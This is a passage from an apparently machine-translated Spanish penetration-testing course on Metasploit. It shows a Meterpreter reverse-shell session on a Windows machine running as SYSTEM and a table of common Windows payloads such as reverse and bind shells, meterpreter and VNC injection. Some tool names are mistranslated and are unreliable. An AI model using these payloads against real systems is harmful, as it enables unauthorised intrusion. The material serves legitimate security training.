`Channel 1`se ha creado, y nos colocamos automáticamente en la CLI para esta máquina. El canal aquí representa la conexión entre nuestro dispositivo y el host de destino, que se ha establecido en una conexión TCP inversa (desde el host de destino a nosotros) utilizando un stager y etapa de meterpreter. El Stager se activó en nuestra máquina para esperar una solicitud de conexión inicializada por la carga útil de la etapa en la máquina de destino.

En algunos casos, mudarse a un caparazón estándar en el objetivo es útil, pero Meterpreter también puede navegar y realizar acciones en la máquina de víctimas. Entonces vemos que los comandos han cambiado, pero tenemos el mismo nivel de privilegio dentro del sistema.

### **MSF - Windows CMD**

Cargas útiles

```
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system

```

Veamos qué otros tipos de cargas útiles podemos usar. Veremos los más comunes relacionados con los sistemas operativos de Windows.

---

# **Tipos de carga útil**

La siguiente tabla contiene las cargas útiles más comunes utilizadas para las máquinas de Windows y sus respectivas descripciones.

| **Carga útil** | **Descripción** |
| --- | --- |
| `generic/custom` | Oyente genérico, uso múltiple |
| `generic/shell_bind_tcp` | Oyente genérico, múltiples usos, shell normal, unión de conexión TCP |
| `generic/shell_reverse_tcp` | Oyente genérico, múltiples usos, carcasa normal, conexión TCP inversa |
| `windows/x64/exec` | Ejecuta un comando arbitrario (Windows X64) |
| `windows/x64/loadlibrary` | Carga una ruta arbitraria de biblioteca x64 |
| `windows/x64/messagebox` | Genera un cuadro de diálogo a través de MessageBox utilizando un título, texto e icono personalizables |
| `windows/x64/shell_reverse_tcp` | Shell normal, carga útil única, conexión TCP inversa |
| `windows/x64/shell/reverse_tcp` | Shell normal, stager + etapa, conexión TCP inversa |
| `windows/x64/shell/bind_ipv6_tcp` | Shell normal, stager + etapa, ipv6 bind tcp stager |
| `windows/x64/meterpreter/$` | Carga útil de meterpreter + variedades anteriores |
| `windows/x64/powershell/$` | Sesiones interactivas de PowerShell + variedades anteriores |
| `windows/x64/vncinject/$` | Servidor VNC (inyección reflectante) + variedades anteriores |

Otras cargas útiles críticas que son muy utilizadas por los probadores de penetración durante las evaluaciones de seguridad son las cargas útiles de huelga de imperios y cobalto. Estos no están en el alcance de este curso, pero no dude en investigarlos en nuestro tiempo libre, ya que pueden proporcionar una cantidad significativa de información sobre cómo los probadores de penetración profesional realizan sus evaluaciones en objetivos de alto valor.

Además de estos, por supuesto, hay una gran cantidad de otras cargas útiles. Algunos son para proveedores de dispositivos específicos, como Cisco, Apple o PLCS. Algunos podemos generarnos usando`msfvenom`. Sin embargo, a continuación, veremos`Encoders`y cómo se pueden usar para influir en el resultado del ataque.